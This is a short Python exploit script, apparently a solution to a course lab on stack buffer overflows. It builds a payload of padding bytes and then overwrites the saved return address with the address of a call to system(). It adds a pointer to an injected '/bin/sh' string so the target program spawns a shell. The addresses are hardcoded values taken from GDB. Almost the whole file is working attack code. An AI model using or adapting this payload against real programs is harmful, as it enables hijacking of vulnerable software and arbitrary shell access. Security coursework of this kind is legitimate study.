#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

# Data from GDB
ebp = 0xfffeec58
buf_ptr = 0xfffeec46
system_fptr = 0x80488b3

sys_str_b = b"/bin/sh"

padding_len = (4 + ebp - buf_ptr)
str_ptr = buf_ptr + padding_len + 8

# Desired stack layout:
# -- Padding --
# &(call system)  <- Overwriting ret_addr
# &str            <- Injecting argument to system
# str = "/bin/sh"

sys.stdout.buffer.write(b"A" * padding_len)
sys.stdout.buffer.write(pack("<I", system_fptr))
sys.stdout.buffer.write(pack("<I", str_ptr))
sys.stdout.buffer.write(sys_str_b)

sys.stdout.buffer.flush()
